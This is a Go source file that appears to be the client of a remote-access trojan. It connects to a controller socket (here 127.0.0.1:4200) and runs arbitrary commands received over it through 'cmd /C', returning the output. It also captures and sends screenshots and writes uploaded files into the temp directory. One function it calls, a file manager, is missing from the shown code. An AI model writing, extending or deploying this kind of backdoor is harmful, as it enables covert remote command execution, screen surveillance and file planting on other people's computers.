package main

import (
	// "bufio"
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"os"

	"image/png"
	"os/exec"

	"strings"

	"github.com/kbinani/screenshot"
	// "time"
)

var serverId net.Conn
var clientconnected = 0

func Substring(str string, start, end int) string {
	return strings.TrimSpace(str[start:end])
}
func executeCommand(comm string) string {
	cmd := exec.Command("cmd", "/C", comm)
	out, err := cmd.Output()
	result := string(out[:])
	if err != nil {
		fmt.Println("err", err)
		return "err"
	}
	//fmt.Println(string(result))
	return result
}
func receveMessage() {

	CONNECT := "127.0.0.1:4200"
	flag := 0
	for {
		var c, err = net.Dial("tcp", CONNECT)
		if c == nil {
			if flag == 0 {
				fmt.Println("Server not started.")
				flag++
			}
			continue
		}
		if err != nil {
			fmt.Println("err", err)
			os.Exit(0)
			return
		}

		if c != nil {
			serverId = c
			fmt.Println("Server connected...")
			break
		}
	}

	clientconnected = 1
	for {
		buffer := make([]byte, 1024)
		// Read data from the client
		n, err := serverId.Read(buffer)
		if n == 0 {
			os.Exit(0)
			return
		}
		if err != nil {
			fmt.Println("Error:", err)
			os.Exit(0)
			return
		}

		var myString string = string(buffer[:n])
		fmt.Println(myString)
		substr2 := Substring(myString, 3, n)
		if bytes.Equal([]byte("screenshot"), []byte(myString)) {
			SendAScreenshot(serverId)
		} else if bytes.Equal([]byte("File_Upload"), []byte(myString)) {
			incomingFileToStore(serverId)
		} else if myString[0] == 'c' && myString[1] == '-' && myString[2] == ' ' {
			res := executeCommand(substr2)
			_, err := serverId.Write([]byte(res))
			if err != nil {
				fmt.Println("err", err)
			}
		}else if bytes.Equal([]byte("Open_File_manager"), []byte(Substring(myString, 0, len("Open_File_manager")))) {
			openFileManager(serverId,Substring(myString, len("Open_File_manager"),n))
		} else {
			fmt.Println("Received: ", buffer[:n])
		}

	}
}

func sendMessage() {
	for {
		if clientconnected == 0 {
			continue
		}
		c := serverId

		reader := bufio.NewReader(os.Stdin)
		text, _ := reader.ReadString('\n')
		data := []byte(text)
		_, err := c.Write(data)
		if err != nil {
			fmt.Println("Error:", err)
			c.Close()
			return
		}
	}
}
func main() {
	go receveMessage()
	sendMessage()

}

func SendAScreenshot(conn net.Conn) {
	fileName := "screenshot.png"

	// Open the file to send
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		fmt.Println("Failed to capture the screen:", err)
		return
	}

	// Create an output file for the screenshot
	outputFile, err := os.Create(fileName)
	if err != nil {
		fmt.Println("Failed to create the output file:", err)
		return
	}
	defer outputFile.Close()

	// Save the screenshot to the output file in PNG format
	err = png.Encode(outputFile, img)
	if err != nil {
		fmt.Println("Failed to save the screenshot:", err)
		return
	}
	// fmt.Println("Screenshot saved as screenshot.png")

	file, err := os.Open(fileName)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	// send message type
	data := []byte("screenshot")
	_, _ = conn.Write(data)

	// Create a buffer to hold the file data
	buffer := make([]byte, 1024)
	for {
		n, err := file.Read(buffer)
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Println("Error reading file:", err)
			return
		}
		conn.Write(buffer[:n])
		if n < 1024 {
			break
		}
	}

	fmt.Println("Sent file: %s", fileName)
}

func incomingFileToStore(conn net.Conn) {
	buffer := make([]byte, 1024)
	n, err := serverId.Read(buffer)
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(0)
		return
	}

	fileName := string(buffer[:n])
	tempDir := os.TempDir()
	tempDir = strings.Replace(tempDir, "\\", "/", -1)
	file, err := os.Create(tempDir + "/" + fileName)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	// Create a buffer to hold the incoming file data
	buffer = make([]byte, 1024)
	// Receive and write the file data to the new file
	for {
		n, err := conn.Read(buffer)
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Println("Error reading file data:", err)
			return
		}
		file.Write(buffer[:n])
		if n < 1024 {
			break
		}
	}
	_, _ = conn.Write([]byte("File saved at client's location : C:/Users/ubuntu/AppData/Local/Temp/" + fileName))
	fmt.Println("Received file:", fileName)
}
